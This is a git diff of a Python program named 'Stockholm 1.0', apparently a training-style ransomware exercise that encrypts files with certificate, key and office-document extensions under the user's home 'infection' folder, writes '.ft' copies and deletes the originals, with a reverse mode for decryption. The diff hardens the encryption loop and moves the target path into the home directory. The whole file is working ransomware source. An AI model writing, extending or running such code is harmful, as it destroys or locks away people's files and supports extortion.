@@ -5,6 +5,9 @@ from colorama import Fore
 import argparse
 from sys import exit
 
+# gerer les perms 
+# essayer de creer un file comme le nom qui va etre encrypter ex touch testr.txt.ft et voir la reaction du programme
+
 file_extensions = [
     '.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', 
     '.sxw', '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', 
@@ -29,11 +32,11 @@ file_extensions = [
     '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc'
 ]
 
-def generate_key():
+def generate_key(all_files):
     '''
     Generate a key and save it in key.key
     '''
-    if (os.path.exists('key')):
+    if (os.path.exists('key') and len(all_files) == 0):
         print("The file are already encrypted !")
         exit(0)
 
@@ -51,14 +54,20 @@ def encrypt_file(cryptography, all_files, silent):
         if not silent:
             print(Fore.RED + file, "Encrypting...", Fore.RESET)
             time.sleep(0.05)
+        try:
+            with open(file, 'r') as file_no_crypto:
+                file_data = file_no_crypto.read()
+        except:
+            print(Fore.RED + "The file", file ,"is not readable", Fore.RESET)
+            continue
 
-        with open(file, 'r') as file_no_crypto:
-            file_data = file_no_crypto.read()
-        
         content_file_crypto = cryptography.encrypt(file_data.encode())
 
         if not silent:
             print(content_file_crypto)
+
+        if (os.path.exists(file + ".ft")):
+            os.remove(file + ".ft")
 
         with open(file + ".ft", 'wb') as file_crypto:
             file_crypto.write(content_file_crypto)
@@ -88,8 +97,12 @@ def decrypt_files(all_files, silent):
             print(Fore.GREEN + file, "Decrypting..." ,Fore.RESET)
             time.sleep(0.05)
 
-        with open (file, 'rb') as file_crypto:
-            file_data = file_crypto.read()
+        try:
+            with open (file, 'rb') as file_crypto:
+                file_data = file_crypto.read()
+        except:
+            print(Fore.RED + "The file", file ,"is not readable", Fore.RESET)
+            continue
 
         file_content = cryptography.decrypt(file_data)
 
@@ -118,7 +131,7 @@ def remove_encrypted_files(all_files):
         os.remove(file)
     os.remove('key')
 
-def select_files_with_good_extension(reverse, path = './infection/', files = []):
+def select_files_with_good_extension(reverse, path = os.path.join(os.environ.get('HOME', './'), "infection/"), files = []):
     '''
     Select all files with good extension
     '''
@@ -150,12 +163,11 @@ def do_parse():
 def main():
     args = do_parse()
     all_files = select_files_with_good_extension(args.reverse)
-    print("All files: ", all_files)
     if (args.version):
         print("Stockholm 1.0")
         exit(0)
     if args.reverse == False:
-        key = generate_key()
+        key = generate_key(all_files)
         cryptography = Fernet(key)
         encrypt_file(cryptography, all_files, args.silent)
         remove_not_encrypted_files(all_files)
